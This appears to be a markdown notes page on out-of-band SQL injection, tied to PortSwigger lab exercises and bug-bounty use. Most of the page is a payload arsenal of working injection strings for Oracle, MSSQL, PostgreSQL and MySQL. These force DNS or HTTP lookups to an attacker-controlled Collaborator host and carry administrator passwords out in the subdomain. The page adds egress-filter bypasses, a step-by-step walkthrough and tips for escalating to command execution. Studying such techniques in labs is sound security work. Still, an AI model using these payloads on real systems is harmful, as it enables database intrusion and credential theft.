# SQL injection — Out-of-band (OAST)

When the query is processed **asynchronously** (or no in-band signal exists at all), force the DB to make an outbound network request — typically DNS — to a server you control (Burp Collaborator). Detection comes from the interaction; data is exfiltrated inside the subdomain. The most powerful blind method: works when boolean/error/time all fail, and exfiltrates data in bulk. Max impact: full data theft via DNS even with zero in-band feedback.

## Quick reference

```
-- trigger DNS lookup (detection)  [Oracle, via XXE in EXTRACTVALUE]
'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLAB-SUBDOMAIN/"> %remote;]>'),'/l')+FROM+dual--
-- exfiltrate data in the subdomain  [Oracle]
'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLAB-SUBDOMAIN/"> %remote;]>'),'/l')+FROM+dual--
```

DB-specific DNS primitives:
```sql
-- Microsoft
'; exec master..xp_dirtree '//BURP-COLLAB-SUBDOMAIN/a'--
-- PostgreSQL
'; copy (SELECT '') to program 'nslookup BURP-COLLAB-SUBDOMAIN'--
-- MySQL (Windows only)
'; SELECT ... INTO OUTFILE '\\\\BURP-COLLAB-SUBDOMAIN\\a'--    /  LOAD_FILE('\\\\BURP-COLLAB-SUBDOMAIN\\a')
-- Oracle (patched, needs privs)
'; SELECT UTL_INADDR.get_host_address('BURP-COLLAB-SUBDOMAIN')--
```

Decision list:
- No in-band difference at all, or query looks async → go OAST.
- First just trigger a DNS hit (proves execution). Then prepend `(SELECT secret)||'.'` into the hostname to exfiltrate.
- DNS is best (egress almost always allowed). HTTP interaction = bonus confirmation.

## Root cause
The DB can be coerced into network calls (XML external entities, file/UNC paths, program execution, name resolution). Even when the app discards the query result, the side-effecting network call still fires.

## Find it (recon and detection)
- You've exhausted boolean/error/time, or the query is clearly fire-and-forget (analytics, logging).
- Insert a Collaborator subdomain via a DNS primitive; **poll Collaborator** for a DNS/HTTP hit. A hit = your injection executes server-side.
- Async note: the lookup may arrive seconds later — poll a few times.

## Technique
1. **Pick the DB's OOB primitive** (table above). Oracle's `EXTRACTVALUE(xmltype(... SYSTEM "http://collab/" ...))` works on many unpatched installs without elevated privs.
2. **Trigger** a bare DNS lookup to confirm execution.
3. **Exfiltrate:** concatenate a subquery into the hostname label so the leaked value becomes the subdomain: `http://'||(SELECT password FROM users WHERE username='administrator')||'.collab/`. The password shows up as the DNS query's leftmost label in Collaborator.
4. **Read it** in the Collaborator tab: DNS interaction → full looked-up domain (Description); HTTP → Host header.

**Advanced / edge cases:**
- **Long/odd values:** DNS labels max 63 chars, full name 253; chunk with `SUBSTRING` and multiple lookups, and hex/replace chars illegal in DNS (`@`, `.` inside data) e.g. `REPLACE(...,'@','-')` or hex-encode.
- **Conditional OOB** (detection-only channel): only do the lookup when a condition holds — `CASE WHEN cond THEN (trigger) ELSE NULL END` — to infer bits when you can't fit data in the label.
- **Postgres `COPY ... TO PROGRAM`** needs superuser; great for RCE-adjacent exfil. **MSSQL `xp_dirtree`/`xp_fileexist`** very reliable. **MySQL** OOB is Windows-only (UNC paths) and usually needs `FILE` priv + `secure_file_priv` unset.
- **Why prefer OAST even when other channels work:** asynchronous reliability and direct bulk data exfil in one request.

## Payload arsenal
```sql
-- Oracle detection
'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://COLLAB/">%r;]>'),'/l')+FROM+dual--
-- Oracle exfil
'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/">%r;]>'),'/l')+FROM+dual--
-- MSSQL
'; exec master..xp_dirtree '//COLLAB/a'--
declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.COLLAB/a"')--
-- PostgreSQL
'; copy (SELECT '') to program 'nslookup COLLAB'--
'; copy (SELECT '') to program 'nslookup '||(SELECT password FROM users LIMIT 1)||'.COLLAB'--
-- MySQL (Windows)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.COLLAB\\a')),NULL--
```

## Bypasses
| Blocker | Bypass |
|---|---|
| HTTP egress blocked | use DNS (almost always allowed) |
| chars illegal in DNS | hex-encode / `REPLACE` / chunk with `SUBSTRING` |
| value > 63 chars | split into multiple labels / multiple lookups |
| `EXTRACTVALUE` patched (Oracle) | `UTL_INADDR.get_host_address` (needs privs), `UTL_HTTP`, `DBMS_LDAP` |
| keyword filter | encode keywords — see `../WAF-filter-bypass/` |

## Exploitation walkthrough (Oracle, TrackingId cookie)
1. In Burp Repeater set `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('...SYSTEM "http://COLLAB/"...'),'/l')+FROM+dual--` (use "Insert Collaborator payload" for the subdomain). Send.
2. Poll Collaborator → a DNS interaction appears ⇒ injection executes (lab solved at this point).
3. Upgrade to exfil: put `'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/` as the host. Send, poll Collaborator.
4. The admin password appears as the leftmost label of the DNS/HTTP interaction. Log in → solved.

## Chaining
- Exfil channel overlaps with [XXE-injection](../../XXE-injection/) (same external-entity trick) and [SSRF](../../SSRF/) (forcing server-side requests).
- Leaked creds → [Authentication](../../Authentication/) / account takeover.
- `COPY ... TO PROGRAM` / `xp_cmdshell` → [OS-command-injection](../../OS-command-injection/) / RCE.

## Tools
- **Burp Collaborator** (Pro): generate subdomain ("Insert Collaborator payload"), "Poll now" to read DNS/HTTP interactions and the exfiltrated label.
- **Burp Repeater:** deliver the payload.
- **interactsh** (open-source) as a Collaborator alternative.
- **sqlmap:** `--dns-domain` for DNS exfil if you control a domain's nameserver.

## Labs

### Lab: Blind SQL injection with out-of-band interaction [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
- Method: `TrackingId` cookie. Inject Oracle `EXTRACTVALUE(xmltype(... SYSTEM "http://COLLAB/" ...)) FROM dual` to trigger a DNS lookup; "Insert Collaborator payload" for the subdomain; poll Collaborator to see the DNS hit. The interaction solves it.
- Insight: an async query yields no in-band signal, but the forced DNS lookup is observable out-of-band. Real-target transfer: when nothing in-band moves, fire a Collaborator DNS payload — an interaction proves blind injection.

### Lab: Blind SQL injection with out-of-band data exfiltration [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
- Method: same Oracle XXE primitive, but build the hostname as `'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/`. Poll Collaborator; the admin password is the leftmost DNS label. Log in.
- Insight: concatenate the secret into the DNS name → the lookup carries the data to you. Real-target transfer: upgrade an OOB detection into bulk exfil by embedding `(SELECT secret)` in the subdomain.

## Real-world notes
- OAST is the gold-standard blind detector in real bounties — many "unexploitable" injections light up Collaborator.
- DNS egress is permitted on most networks even when HTTP isn't, which is why DNS exfil is so reliable.
- CVSS: full data exfil → High–Critical. The bare DNS interaction alone is strong evidence of server-side injection.

## References
- https://portswigger.net/web-security/sql-injection/blind
- https://portswigger.net/web-security/sql-injection/cheat-sheet
